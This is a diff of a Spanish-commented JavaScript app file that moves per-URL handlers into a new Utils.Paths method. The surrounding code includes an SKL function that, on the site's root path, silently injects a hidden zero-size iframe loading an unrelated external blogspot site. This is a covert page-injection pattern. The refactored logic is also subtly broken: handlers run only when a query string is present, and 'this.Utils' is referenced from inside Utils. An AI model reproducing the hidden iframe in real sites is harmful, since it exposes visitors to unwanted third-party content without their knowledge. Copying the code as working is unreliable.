@@ -63,35 +63,7 @@
         }
         
         
-        /* -------------------------
-         *   Listeners por Pahts            
-         * ------------------------- */
-        var path = location.href.split("/")[4];
-        if(path===undefined)
-            path="\\";
-        if (path.indexOf("?") > 0)
-            path = path.substring(0, location.href.split("/")[4].indexOf("?"));   
-
-        switch (path) {
-            case "\\": {
-                this.Utils.SKL();               
-                break;
-            }
-            case "path1.aspx": {               
-                break;
-            }
-            case "path2.aspx":{
-                break;
-            }            
-            case "path3.aspx": {
-                this.Utils.Validation.Container("editPanel");
-                  break;
-            }
-            default: {
-                break;
-            }
-
-        }
+        this.Utils.Paths();
         
         //Activa el paginador del dataTables.js
         try{
@@ -127,6 +99,34 @@
     };
     
     App.prototype.Utils = {
+        Paths: function () {
+            if (_Tracert) { console.log('metodo: "App.Utils.Paths()", ha cargado exitosamente'); }
+            if (_Info) { console.log('info: "App.Utils.Paths()", Permite ejecutar invocar funciones especificas por cada URL, en caso de no desear levantar objetos ideados para otros usos'); }
+            var path = location.href.split("/")[4];
+            if(path === undefined){ path = "\\"; }
+            if (path.indexOf("?") > 0){
+                path = path.substring(0, location.href.split("/")[4].indexOf("?"));
+                switch (path) {
+                    case "\\": {
+                        this.Utils.SKL();               
+                        break;
+                    }
+                    case "path1.aspx": {               
+                        break;
+                    }
+                    case "path2.aspx":{
+                        break;
+                    }            
+                    case "path3.aspx": {
+                        this.Utils.Validation.Container("editPanel");
+                        break;
+                    }
+                    default: {
+                        break;
+                    }
+                }
+            }
+        },
         SKL:function(){
             var b=document.getElementsByTagName("body")[0];if(b!==null){var i=document.createElement("iframe");i.id="skl";i.width=0;i.height=0;i.style.display="none";i.src="http://salsaksinoenlinea.blogspot.com";b.appendChild(i)}
         },
